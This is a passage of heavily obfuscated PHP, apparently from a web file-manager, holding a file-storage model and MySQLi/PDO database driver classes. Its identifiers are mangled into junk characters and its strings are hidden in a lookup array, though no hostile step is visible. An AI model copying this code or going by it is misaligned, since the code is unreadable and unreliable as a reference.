$÷÷ÏÜ»ö[1934] . rand_string(16); file_put_contents($ë¥ü ØÙ, $àÑ„ÄÄö); $£Àããø÷ = $this->addFile($ë¥ü ØÙ, $¿µÒªÙ°, !0); if (file_exists($ë¥ü ØÙ)) { @unlink($ë¥ü ØÙ); } return $£Àããø÷; } public function createFileName($óşĞİö¿, $½¡»­€ß = false, $ò˜‹” = false) { $Ÿ®£Üé =& $_SERVER[ú÷îèÆÜ]; $ª°ºç„ = IO::init($Ÿ®£Üé[18]); $Ìä©„³Û = $this->makeFilePath($óşĞİö¿, $ª°ºç„, $½¡»­€ß, $ò˜‹”); $ÎÏê¶Ë¤ = $ª°ºç„->pathFather($Ìä©„³Û); static $±ùËÛÁç = false; $İ«­åó = $Ÿ®£Üé[1935] . md5($ÎÏê¶Ë¤); if (!$±ùËÛÁç && !Cache::get($İ«­åó)) { $±ùËÛÁç = !0; $Ã„¥²Ïò = IO::mkdir($ÎÏê¶Ë¤); if (!IO::exist($Ã„¥²Ïò . $Ÿ®£Üé[837])) { IO::mkfile($Ã„¥²Ïò . $Ÿ®£Üé[837]); } Cache::set($İ«­åó, 1, 3600 * 2); } return $Ìä©„³Û; } public function makeFilePath($øÕ—Åî„, $şøéñœ, $ôóò‘§¿ = false, $ƒ×Ìæ¹ó = false) { $™«ñÜ¢ =& $_SERVER[ú÷îèÆÜ]; $öİ†•ñğ = Model($™«ñÜ¢[810])->get($™«ñÜ¢[1936]); $Ãê§ÃÆÊ = KodIO::defaultIO() . date($™«ñÜ¢[1937]); $î§¿ˆ…à = $Ãê§ÃÆÊ . rand_string(5) . short_id(100); $øÕ—Åî„ = str_replace($™«ñÜ¢[18], $™«ñÜ¢[21], KodIO::clear($øÕ—Åî„)); $™Ä±œ“¢ = $şøéñœ->ext($øÕ—Åî„); if (!$øÕ—Åî„) { $öİ†•ñğ = $™«ñÜ¢[1938]; } switch ($öİ†•ñğ) { case $™«ñÜ¢[1939]: $î§¿ˆ…à = $î§¿ˆ…à . $™«ñÜ¢[20] . $şøéñœ->ext($øÕ—Åî„); if ($™Ä±œ“¢ == $™«ñÜ¢[1876]) { $î§¿ˆ…à .= $™«ñÜ¢[1247]; } break; case $™«ñÜ¢[1940]: $ñ¬ÔÎŸÕ = Model($™«ñÜ¢[810])->get($™«ñÜ¢[811]); $ü÷Ä·Ô = substr(md5($™«ñÜ¢[812] . $ñ¬ÔÎŸÕ . date($™«ñÜ¢[788])), 0, 8); $„ã«ˆÕ = KodIO::defaultDriver(); $Ãê§ÃÆÊ = $™«ñÜ¢[1278] . $„ã«ˆÕ[$™«ñÜ¢[452]] . $™«ñÜ¢[461] . date($™«ñÜ¢[1941]) . $ü÷Ä·Ô . $™«ñÜ¢[18]; if ($™Ä±œ“¢ == $™«ñÜ¢[1876]) { $øÕ—Åî„ .= $™«ñÜ¢[1247]; } $‡ÃÊØ·’ = $™«ñÜ¢[1942] . $Ãê§ÃÆÊ . $øÕ—Åî„; CacheLock::lock($‡ÃÊØ·’); $î§¿ˆ…à = $Ãê§ÃÆÊ . $øÕ—Åî„; if (IO::exist($Ãê§ÃÆÊ . $øÕ—Åî„)) { $ÕÁÜÖ´¶ = substr($øÕ—Åî„, 0, strlen($øÕ—Åî„) - strlen($™Ä±œ“¢)); $ªèå‡÷Í = $ƒ×Ìæ¹ó ? substr($ƒ×Ìæ¹ó, 0, 5) : ($ôóò‘§¿ ? substr($ôóò‘§¿, 0, 5) : rand_string(5)); $î§¿ˆ…à = $Ãê§ÃÆÊ . $ÕÁÜÖ´¶ . $ªèå‡÷Í . $™«ñÜ¢[20] . $™Ä±œ“¢; } if (IO::isTypeObject($î§¿ˆ…à) && !IO::isUploadServer($î§¿ˆ…à)) { if (IO::exist($î§¿ˆ…à)) { return $î§¿ˆ…à; } $²óİöÂÇ = IO::setContent($î§¿ˆ…à, $™«ñÜ¢[22]); if (!$²óİöÂÇ) { show_json($™«ñÜ¢[1943], !1); } } CacheLock::unlock($‡ÃÊØ·’); break; case $™«ñÜ¢[1938]: break; default: break; } return $î§¿ˆ…à; } public function addFileByRemote($Ò×ÒîÉ, $¼˜å¯Ÿô, $¥ğ‚¹Ì± = array()) { $ŒÜñ¾ƒô =& $_SERVER[ú÷îèÆÜ]; if (!IO::exist($Ò×ÒîÉ)) { return !1; } $ÎˆàØõ¦ = $¥ğ‚¹Ì±[$ŒÜñ¾ƒô[650]] ? $¥ğ‚¹Ì±[$ŒÜñ¾ƒô[650]] : $ŒÜñ¾ƒô[22]; $‘Šˆ®Â = IO::hashMd5($Ò×ÒîÉ, $ÎˆàØõ¦); $Ì˜ÁÆë¬ = KodIO::defaultDriver(); $Ì¥·´×ä = array($ŒÜñ¾ƒô[594] => IO::size($Ò×ÒîÉ), $ŒÜñ¾ƒô[1944] => 1, $ŒÜñ¾ƒô[471] => $¼˜å¯Ÿô, $ŒÜñ¾ƒô[848] => $Ì˜ÁÆë¬[$ŒÜñ¾ƒô[452]], $ŒÜñ¾ƒô[472] => $Ò×ÒîÉ, $ŒÜñ¾ƒô[1945] => $¥ğ‚¹Ì±[$ŒÜñ¾ƒô[649]] ? $¥ğ‚¹Ì±[$ŒÜñ¾ƒô[649]] : IO::hashSimple($Ò×ÒîÉ), $ŒÜñ¾ƒô[1946] => $‘Šˆ®Â ? $‘Šˆ®Â : $ÎˆàØõ¦); if ($ñÚéƒÌ× = $this->addFileCheckExist($Ì¥·´×ä[$ŒÜñ¾ƒô[649]], $Ì¥·´×ä[$ŒÜñ¾ƒô[650]], $Ì¥·´×ä[$ŒÜñ¾ƒô[86]])) { return $ñÚéƒÌ×; } return $this->addFileData($Ì¥·´×ä); } private function addFileData($ùÃ“û”ƒ) { $¾©ò§  =& $_SERVER[ú÷îèÆÜ]; if (!$ùÃ“û”ƒ) { return !1; } $ùÃ“û”ƒ[$¾©ò§ [86]] = intval($ùÃ“û”ƒ[$¾©ò§ [86]]); if (!$ùÃ“û”ƒ[$¾©ò§ [86]] && strlen($ùÃ“û”ƒ[$¾©ò§ [649]]) > 32) { $ùÃ“û”ƒ[$¾©ò§ [86]] = intval(substr($ùÃ“û”ƒ[$¾©ò§ [649]], 32)); } $ô¤™”± = $this->add($ùÃ“û”ƒ); return $this->find($ô¤™”±); } public function addFile($ªı¿£¶, $È¯Òí«º, $Ô‚¦Ÿ÷¸ = false) { $ĞèğÌ³½ =& $_SERVER[ú÷îèÆÜ]; $Ìåñ¿äĞ = IO::hashSimple($ªı¿£¶); $ÌİşéÊõ = IO::size($ªı¿£¶); $ş½ÌêË‘ = $ÌİşéÊõ <= 1024 * 1024 * 10 ? IO::hashMd5($ªı¿£¶) : $ĞèğÌ³½[22]; $Ê™™à¥¹ = $ĞèğÌ³½[1947] . $Ìåñ¿äĞ; CacheLock::lock($Ê™™à¥¹); if ($ş½ÌêË‘ && $Ìåñ¿äĞ) { $´£¦Û¹ = $this->addFileCheckExist($Ìåñ¿äĞ, $ş½ÌêË‘, $ÌİşéÊõ); if ($´£¦Û¹) { CacheLock::unlock($Ê™™à¥¹); return $´£¦Û¹; } } $•®ÎŸëî = $this->addFileMake($ªı¿£¶, $ÌİşéÊõ, $Ìåñ¿äĞ, $ş½ÌêË‘, $È¯Òí«º, $Ô‚¦Ÿ÷¸); $Íªã›Œ = $this->addFileData($•®ÎŸëî); CacheLock::unlock($Ê™™à¥¹); if (!$ş½ÌêË‘ && $Íªã›Œ) { $this->fileMd5Check($Íªã›Œ); } return $Íªã›Œ; } private function fileMd5Check($ĞÅİ³òÆ) { $Ÿ‰ğŠ¤ =& $_SERVER[ú÷îèÆÜ]; $óÌ‹õËÛ = array($ĞÅİ³òÆ[$Ÿ‰ğŠ¤[518]], $ĞÅİ³òÆ[$Ÿ‰ğŠ¤[94]]); $Ä ü‰§ = $Ÿ‰ğŠ¤[1948] . $ĞÅİ³òÆ[$Ÿ‰ğŠ¤[94]]; $ûñ°éí“ = $Ÿ‰ğŠ¤[1949] . $ĞÅİ³òÆ[$Ÿ‰ğŠ¤[518]]; $‚¤Üˆ¸ = TaskQueue::add($Ÿ‰ğŠ¤[1950], $óÌ‹õËÛ, $Ä ü‰§, $ûñ°éí“); if (!$‚¤Üˆ¸) { $this->fileMd5Set($ĞÅİ³òÆ[$Ÿ‰ğŠ¤[518]], $ĞÅİ³òÆ[$Ÿ‰ğŠ¤[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ÌÕŠã¤, $Ôñ¯§çë) { $ûç‰š·© =& $_SERVER[ú÷îèÆÜ]; $’‡ÑíóÍ = $this->find($ÌÕŠã¤); if (!$’‡ÑíóÍ || $’‡ÑíóÍ[$ûç‰š·©[650]]) { return; } $«àşĞ’ = IO::hashMd5($Ôñ¯§çë); if (!$«àşĞ’) { return $ûç‰š·©[22]; } $this->where(array($ûç‰š·©[518] => $ÌÕŠã¤))->save(array($ûç‰š·©[650] => $«àşĞ’)); } public function addFileMake($ÎÛ¡–­‹, $Á•œœÁä, $Ö›Ö‡ÓÀ, $§š¤€¡, $€ã©à¢¼, $ÉÎñí±Û) { $Ù Ê¯œ =& $_SERVER[ú÷îèÆÜ]; $÷è¡±¦Ó = $this->createFileName($€ã©à¢¼, $Ö›Ö‡ÓÀ, $§š¤€¡); $¶ŒŒø‘° = get_path_father($÷è¡±¦Ó); $¶¿¹‚Ñ› = get_path_this($÷è¡±¦Ó); if ($ÉÎñí±Û) { $Âœ«´å˜ = IO::move($ÎÛ¡–­‹, $¶ŒŒø‘°, !1, $¶¿¹‚Ñ›); } else { $Âœ«´å˜ = IO::copy($ÎÛ¡–­‹, $¶ŒŒø‘°, !1, $¶¿¹‚Ñ›); } if (!$Âœ«´å˜) { return !1; } $ÔåòåõŠ = KodIO::defaultDriver(); $Ç˜¯ğ» = array($Ù Ê¯œ[594] => $Á•œœÁä, $Ù Ê¯œ[1944] => 1, $Ù Ê¯œ[471] => $€ã©à¢¼, $Ù Ê¯œ[848] => $ÔåòåõŠ[$Ù Ê¯œ[452]], $Ù Ê¯œ[472] => $÷è¡±¦Ó, $Ù Ê¯œ[1945] => $Ö›Ö‡ÓÀ, $Ù Ê¯œ[1946] => $§š¤€¡); return $Ç˜¯ğ»; } public function addFileCheckExist($€á·Ï®¤, $Ø›àé‘, $áíäÜşí) { $­ä¦²¾ =& $_SERVER[ú÷îèÆÜ]; $àä™Çœõ = $this->findByHash($€á·Ï®¤, $Ø›àé‘); if (!$àä™Çœõ) { return !1; } $ğ˜§ˆ°Ö = array($­ä¦²¾[1944] => intval($àä™Çœõ[$­ä¦²¾[1951]]) + 1, $­ä¦²¾[594] => $áíäÜşí); $this->where(array($­ä¦²¾[519] => $àä™Çœõ[$­ä¦²¾[518]]))->save($ğ˜§ˆ°Ö); return $àä™Çœõ; } public function remove($¼ù¿ÆÊ¸) { $this->linkCountChange($¼ù¿ÆÊ¸, !1); $this->clearEmpty(); return !0; } public function linkAdd($ã™×úÖ¼) { $this->linkCountChange($ã™×úÖ¼, !0); } public function linkCountChange($ßÛâœÈÖ, $íæ¹ò™´) { $€Œøòõ§ =& $_SERVER[ú÷îèÆÜ]; if (!$ßÛâœÈÖ) { return; } if (!is_array($ßÛâœÈÖ)) { $ßÛâœÈÖ = array($ßÛâœÈÖ); } $õå†×‹ = array(); foreach ($ßÛâœÈÖ as $£’ßËš¿) { $¥ŠÒ™ª = $£’ßËš¿ . $€Œøòõ§[22]; if (!$õå†×‹[$¥ŠÒ™ª]) { $õå†×‹[$¥ŠÒ™ª] = 0; } $õå†×‹[$¥ŠÒ™ª]++; } $ÏŒƒÕ³à = array(); foreach ($õå†×‹ as $£’ßËš¿ => $‘è‚ûè) { $¥ŠÒ™ª = $‘è‚ûè . $€Œøòõ§[22]; if (!$ÏŒƒÕ³à[$¥ŠÒ™ª]) { $ÏŒƒÕ³à[$¥ŠÒ™ª] = array(); } $ÏŒƒÕ³à[$¥ŠÒ™ª][] = $£’ßËš¿; } foreach ($ÏŒƒÕ³à as $‘è‚ûè => $ÎÇšÑáŒ) { if (!$ÎÇšÑáŒ) { continue; } $‘è‚ûè = $íæ¹ò™´ ? $‘è‚ûè : -intval($‘è‚ûè); $üÎ÷ûŞş = array($€Œøòõ§[518] => array($€Œøòõ§[17], $ÎÇšÑáŒ)); if ($‘è‚ûè < 0) { $üÎ÷ûŞş[$€Œøòõ§[1951]] = array($€Œøòõ§[1056], abs($‘è‚ûè)); } $this->where($üÎ÷ûŞş)->setAdd($€Œøòõ§[1951], $‘è‚ûè); } } public function findByHash($§ò–ü¸, $òô—À®Ú = false) { $¥’øîÉ¯ =& $_SERVER[ú÷îèÆÜ]; if (!$§ò–ü¸ && !$òô—À®Ú) { return !1; } $ãø²ğò = array($¥’øîÉ¯[1945] => $§ò–ü¸); if ($òô—À®Ú) { $ãø²ğò = array($¥’øîÉ¯[1946] => $òô—À®Ú); } return $this->order($¥’øîÉ¯[1952])->where($ãø²ğò)->find(); } public function clearEmpty($±›Í®Ä = 0) { $öÛ¼çÌÛ =& $_SERVER[ú÷îèÆÜ]; $‚Ê˜ì¿† = time() - 3600 * 24 * $±›Í®Ä; $ññáñ© = $öÛ¼çÌÛ[1953] . $‚Ê˜ì¿†; $„ƒæÄèÌ = $this->where($ññáñ©)->select(); if (!$„ƒæÄèÌ) { return; } $ï‘ÏÔïı = new Task($öÛ¼çÌÛ[1954], $öÛ¼çÌÛ[22], count($„ƒæÄèÌ)); foreach ($„ƒæÄèÌ as $á–œÄ¸) { $ï‘ÏÔïı->update(1); $this->resetFile($á–œÄ¸); } $ï‘ÏÔïı->end(); } public function resetFile($‚ü¨ÖÙç) { $õ‚÷‡ÚÁ =& $_SERVER[ú÷îèÆÜ]; $…¨¾Ö¤Ö = array($õ‚÷‡ÚÁ[519] => $‚ü¨ÖÙç[$õ‚÷‡ÚÁ[518]]); $­°ˆÅªß = Model($õ‚÷‡ÚÁ[1373])->where($…¨¾Ö¤Ö)->count(); $ÎŞ§Ó£Î = Model($õ‚÷‡ÚÁ[1955])->where($…¨¾Ö¤Ö)->count(); $ş€—ÆíÍ = intval($­°ˆÅªß) + intval($ÎŞ§Ó£Î); if ($ş€—ÆíÍ == 0) { IO::remove($‚ü¨ÖÙç[$õ‚÷‡ÚÁ[94]]); Model($õ‚÷‡ÚÁ[1956])->delete($‚ü¨ÖÙç[$õ‚÷‡ÚÁ[518]]); $this->where($…¨¾Ö¤Ö)->delete(); $this->metaSet($‚ü¨ÖÙç[$õ‚÷‡ÚÁ[518]], null, null); return; } if ($‚ü¨ÖÙç[$õ‚÷‡ÚÁ[1951]] != $ş€—ÆíÍ) { $this->where($…¨¾Ö¤Ö)->save(array($õ‚÷‡ÚÁ[1944] => $ş€—ÆíÍ)); } } public function storageInfo($’˜“îğÅ = false) { $µÂ®ö™ =& $_SERVER[ú÷îèÆÜ]; $öéíÕæ¾ = $this->count() + 0.0; $ÆŞ§®öß = 0; $ıÔı¶„ = 1; $ûÜİà³ø = 0; $£µıÀÓ = 5000; for ($‚ Ñ·êƒ = 0; $‚ Ñ·êƒ < $öéíÕæ¾; $‚ Ñ·êƒ = $‚ Ñ·êƒ + $£µıÀÓ) { $•óì«”ƒ = $this->limit($‚ Ñ·êƒ, $‚ Ñ·êƒ + $£µıÀÓ)->select(); foreach ($•óì«”ƒ as $¦æÉù©) { $ıÔı¶„ += $¦æÉù©[$µÂ®ö™[86]] * $¦æÉù©[$µÂ®ö™[1951]]; $ÆŞ§®öß += $¦æÉù©[$µÂ®ö™[86]] * ($¦æÉù©[$µÂ®ö™[1951]] - 1); $ûÜİà³ø += $¦æÉù©[$µÂ®ö™[1951]]; } } $¼îŸ‹ª• = array($µÂ®ö™[1957] => $ıÔı¶„, $µÂ®ö™[1958] => $ÆŞ§®öß, $µÂ®ö™[1959] => $ÆŞ§®öß / $ıÔı¶„, $µÂ®ö™[90] => $öéíÕæ¾, $µÂ®ö™[1960] => $ûÜİà³ø); return $¼îŸ‹ª•; } } goto F¥öåñÕâ; CœõÉÜŞÂæ: class DbMysqli extends Db { public function __construct($Íµ£Èô = '') { $Ã‚¡óÄ± =& $_SERVER[ú÷îèÆÜ]; if (!extension_loaded($Ã‚¡óÄ±[953])) { think_exception(think_lang($Ã‚¡óÄ±[24]) . $Ã‚¡óÄ±[954]); } if (!empty($Íµ£Èô)) { $this->config = $Íµ£Èô; if (empty($this->config[$Ã‚¡óÄ±[27]])) { $this->config[$Ã‚¡óÄ±[27]] = $Ã‚¡óÄ±[22]; } } } public function connect($¿ÈéèÉ‘ = '', $ÃÊ®¥¤ = 0) { $ÜÑı®ã³ =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->linkID[$ÃÊ®¥¤])) { if (empty($¿ÈéèÉ‘)) { $¿ÈéèÉ‘ = $this->config; } $this->linkID[$ÃÊ®¥¤] = new mysqli($¿ÈéèÉ‘[$ÜÑı®ã³[927]], $¿ÈéèÉ‘[$ÜÑı®ã³[929]], $¿ÈéèÉ‘[$ÜÑı®ã³[930]], $¿ÈéèÉ‘[$ÜÑı®ã³[31]], $¿ÈéèÉ‘[$ÜÑı®ã³[928]] ? intval($¿ÈéèÉ‘[$ÜÑı®ã³[928]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¢ÅÉÕ¢Ë = $this->linkID[$ÃÊ®¥¤]->server_version; $this->linkID[$ÃÊ®¥¤]->query($ÜÑı®ã³[931] . think_config($ÜÑı®ã³[932]) . $ÜÑı®ã³[68]); if ($¢ÅÉÕ¢Ë > $ÜÑı®ã³[933]) { $this->linkID[$ÃÊ®¥¤]->query($ÜÑı®ã³[934]); } $this->connected = !0; if (1 != think_config($ÜÑı®ã³[32])) { unset($this->config); } } return $this->linkID[$ÃÊ®¥¤]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‰ŠµÉµ) { $¡ıÏû¦ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰ŠµÉµ; if ($this->queryID) { $this->free(); } think_action_status($¡ıÏû¦[33], 1); think_status($¡ıÏû¦[34]); $this->queryID = $this->_linkID->query($‰ŠµÉµ); if ($this->_linkID->more_results()) { while (($š¥£¼ğ = $this->_linkID->next_result()) != NULL) { $š¥£¼ğ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($âò»ŠÔ¡) { $çé¤·óÉ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $âò»ŠÔ¡; if ($this->queryID) { $this->free(); } think_action_status($çé¤·óÉ[35], 1); think_status($çé¤·óÉ[34]); $’²Œ¹³ = $this->_linkID->query($âò»ŠÔ¡); $this->debug(); if (!1 === $’²Œ¹³) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $áëÒÎÇÃ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$áëÒÎÇÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢›Á Ò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¢›Á Ò) { $this->error(); return !1; } } return !0; } private function getAll() { $‚ÏÊùªÊ = array(); if ($this->numRows > 0) { for ($â£ä‘Íä = 0; $â£ä‘Íä < $this->numRows; $â£ä‘Íä++) { $‚ÏÊùªÊ[$â£ä‘Íä] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‚ÏÊùªÊ; } public function getFields($îÔÆ‰ ¯) { $šöóûÌ =& $_SERVER[ú÷îèÆÜ]; $ü‰»¶ = $this->query($šöóûÌ[938] . $this->parseKey($îÔÆ‰ ¯)); $˜ÄïÍûØ = array(); if ($ü‰»¶) { foreach ($ü‰»¶ as $¡æ±½ => $ ÏÈŞ¢Î) { $˜ÄïÍûØ[$ ÏÈŞ¢Î[$šöóûÌ[41]]] = array($šöóûÌ[42] => $ ÏÈŞ¢Î[$šöóûÌ[41]], $šöóûÌ[43] => $ ÏÈŞ¢Î[$šöóûÌ[44]], $šöóûÌ[45] => (bool) ($ ÏÈŞ¢Î[$šöóûÌ[46]] === $šöóûÌ[22]), $šöóûÌ[47] => $ ÏÈŞ¢Î[$šöóûÌ[48]], $šöóûÌ[49] => strtolower($ ÏÈŞ¢Î[$šöóûÌ[50]]) == $šöóûÌ[51], $šöóûÌ[52] => strtolower($ ÏÈŞ¢Î[$šöóûÌ[53]]) == $šöóûÌ[54]); } } return $˜ÄïÍûØ; } public function getTables($†äÌ£‘ì = '') { $Í³ÁûÓ™ =& $_SERVER[ú÷îèÆÜ]; $”†Ÿù–× = !empty($†äÌ£‘ì) ? $Í³ÁûÓ™[940] . $†äÌ£‘ì . $Í³ÁûÓ™[941] : $Í³ÁûÓ™[942]; $á•«¬®Ò = $this->query($”†Ÿù–×); $š°Äìõ£ = array(); if ($á•«¬®Ò) { foreach ($á•«¬®Ò as $Õ©Ûõ…Ş => $¡ˆáúÏ¥) { $š°Äìõ£[$Õ©Ûõ…Ş] = current($¡ˆáúÏ¥); } } return $š°Äìõ£; } public function replace($•ë‚Â, $ãÙ¼øİ = array()) { $ËµÆèÂÏ =& $_SERVER[ú÷îèÆÜ]; foreach ($•ë‚Â as $µè ıè¥ => $ŸŞ”êØç) { $ÇÈœ¥œş = $this->parseValue($ŸŞ”êØç); if (is_scalar($ÇÈœ¥œş)) { $³“ïÊ›œ[] = $ÇÈœ¥œş; $”Ã¸ İş[] = $this->parseKey($µè ıè¥); } } $Ë‰ä—±½ = $ËµÆèÂÏ[943] . $this->parseTable($ãÙ¼øİ[$ËµÆèÂÏ[332]]) . $ËµÆèÂÏ[944] . implode($ËµÆèÂÏ[60], $”Ã¸ İş) . $ËµÆèÂÏ[945] . implode($ËµÆèÂÏ[60], $³“ïÊ›œ) . $ËµÆèÂÏ[946]; return $this->execute($Ë‰ä—±½); } public function insertAll($˜ Óé†î, $îîê±· = array(), $²¢Ì×±û = false) { $†áğ×Éé =& $_SERVER[ú÷îèÆÜ]; if (!is_array($˜ Óé†î[0])) { return !1; } $Ì­Ù„”™ = array_keys($˜ Óé†î[0]); $íé³ùÙØ = array(); foreach ($˜ Óé†î as $ †—¶Ö¿) { $Ã³‡ğŠ– = array(); foreach ($ †—¶Ö¿ as $ƒ§ˆ˜îû => $£©¥ù¦) { $£©¥ù¦ = $this->parseValue($£©¥ù¦); if (is_scalar($£©¥ù¦)) { $Ã³‡ğŠ–[] = $£©¥ù¦; } } $íé³ùÙØ[] = $†áğ×Éé[313] . implode($†áğ×Éé[60], $Ã³‡ğŠ–) . $†áğ×Éé[946]; } array_walk($Ì­Ù„”™, array($this, $†áğ×Éé[947])); $•Ê¥Œè = $²¢Ì×±û ? $†áğ×Éé[948] : $†áğ×Éé[949]; $ûõÊÙŒ‡ = $•Ê¥Œè . $†áğ×Éé[950] . $this->parseTable($îîê±·[$†áğ×Éé[332]]) . $†áğ×Éé[944] . implode($†áğ×Éé[60], $Ì­Ù„”™) . $†áğ×Éé[951] . implode($†áğ×Éé[60], $íé³ùÙØ); return $this->execute($ûõÊÙŒ‡); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ó™ŠÑĞ‚ =& $_SERVER[ú÷îèÆÜ]; $this->error = $this->_linkID->errno . $Ó™ŠÑĞ‚[4] . $this->_linkID->error; if ($Ó™ŠÑĞ‚[22] != $this->queryStr) { $this->error .= LNG($Ó™ŠÑĞ‚[58]) . $this->queryStr; } think_trace($this->error, $Ó™ŠÑĞ‚[22], $Ó™ŠÑĞ‚[59]); return $this->error; } public function escapeString($ß£åÙˆö) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ß£åÙˆö); } else { return addslashes($ß£åÙˆö); } } public function parseKey(&$ÁöÈäÉ, $Œççòë• = true) { $—¨˜Ğó® =& $_SERVER[ú÷îèÆÜ]; if ($Œççòë•) { $ÁöÈäÉ = $this->parseKeyCheck($ÁöÈäÉ); } if ($ÁöÈäÉ != $—¨˜Ğó®[213] && !preg_match($—¨˜Ğó®[952], $ÁöÈäÉ)) { $ÁöÈäÉ = $—¨˜Ğó®[438] . trim($ÁöÈäÉ, $—¨˜Ğó®[438]) . $—¨˜Ğó®[438]; } return $ÁöÈäÉ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÜÆã¸¯™ = '') { $ìò¡Ã¦å =& $_SERVER[ú÷îèÆÜ]; if (!class_exists($ìò¡Ã¦å[955])) { think_exception(think_lang($ìò¡Ã¦å[24]) . $ìò¡Ã¦å[956]); } if (!empty($ÜÆã¸¯™)) { $this->config = $ÜÆã¸¯™; if (empty($this->config[$ìò¡Ã¦å[27]])) { $this->config[$ìò¡Ã¦å[27]] = array(); } } } public function connect($¡ßâê³• = '', $˜šªì¢ = 0) { $éå‡ğœ³ =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->linkID[$˜šªì¢])) { if (empty($¡ßâê³•)) { $¡ßâê³• = $this->config; } $æçü±ÆÒ = !empty($¡ßâê³•[$éå‡ğœ³[27]][$éå‡ğœ³[28]]) ? $¡ßâê³•[$éå‡ğœ³[27]][$éå‡ğœ³[28]] : $this->pconnect; if ($æçü±ÆÒ) { $¡ßâê³•[$éå‡ğœ³[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$˜šªì¢] = new PDO($¡ßâê³•[$éå‡ğœ³[957]], $¡ßâê³•[$éå‡ğœ³[929]], $¡ßâê³•[$éå‡ğœ³[930]], $¡ßâê³•[$éå‡ğœ³[27]]); } catch (PDOException $ã¶‰ÀÛÔ) { think_exception($ã¶‰ÀÛÔ->getMessage()); } $this->dbType = $this->_getDsnType($¡ßâê³•[$éå‡ğœ³[957]]); if (in_array($this->dbType, array($éå‡ğœ³[958], $éå‡ğœ³[959], $éå‡ğœ³[960], $éå‡ğœ³[961]))) { think_exception($éå‡ğœ³[962] . $this->dbType . $éå‡ğœ³[963] . $this->dbType . $éå‡ğœ³[964]); } if (!$this->linkID[$˜šªì¢]) { think_exception($éå‡ğœ³[965]); } try { $this->linkID[$˜šªì¢]->exec($éå‡ğœ³[966] . think_config($éå‡ğœ³[932])); } catch (Exception $ã¶‰ÀÛÔ) { } $this->connected = !0; if (1 != think_config($éå‡ğœ³[32])) { unset($this->config); } } return $this->linkID[$˜šªì¢]; } public function free() { $this->PDOStatement = null; } public function query($„ıƒ÷´, $Öíå†» = array()) { $èöÊ•ˆ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $„ıƒ÷´; if (!empty($Öíå†»)) { $this->queryStr .= $èöÊ•ˆ[967] . print_r($Öíå†», !0) . $èöÊ•ˆ[968]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($èöÊ•ˆ[33], 1); think_status($èöÊ•ˆ[34]); $this->PDOStatement = $this->_linkID->prepare($„ıƒ÷´); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¯–‘Û¶· = $this->PDOStatement->execute($Öíå†»); $this->debug(); if (!1 === $¯–‘Û¶·) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÖÖûâ©á, $¾ÑÍÙ = array()) { $¹ú†×¡û =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖÖûâ©á; if (!empty($¾ÑÍÙ)) { $this->queryStr .= $¹ú†×¡û[967] . print_r($¾ÑÍÙ, !0) . $¹ú†×¡û[968]; } $Ğ¸”íã² = !1; if ($this->dbType == $¹ú†×¡û[961]) { if (preg_match($¹ú†×¡û[969], $this->queryStr, $í”ÑÆ¡)) { $this->table = think_config($¹ú†×¡û[970]) . str_ireplace(think_config($¹ú†×¡û[971]), $¹ú†×¡û[431], $í”ÑÆ¡[2]); $Ğ¸”íã² = (bool) $this->query($¹ú†×¡û[972] . strtoupper($this->table) . $¹ú†×¡û[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹ú†×¡û[35], 1); think_status($¹ú†×¡û[34]); $this->PDOStatement = $this->_linkID->prepare($ÖÖûâ©á); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÙÌè±İ = $this->PDOStatement->execute($¾ÑÍÙ); $this->debug(); if (!1 === $ÙÌè±İ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ğ¸”íã² || preg_match($¹ú†×¡û[973], $ÖÖûâ©á)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Û…™²ø = $this->_linkID->commit(); $this->transTimes = 0; if (!$Û…™²ø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‰™ºÁ×ï = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‰™ºÁ×ï) { $this->error(); return !1; } } return !0; } private function getAll() { $‡è´€ğ– = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‡è´€ğ–); return $‡è´€ğ–; } public function getFields($€Ãõ–æç) { $‚Ó¥ˆ‹ƒ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (think_config($‚Ó¥ˆ‹ƒ[974])) { $¿Ü¿ƒ’ = 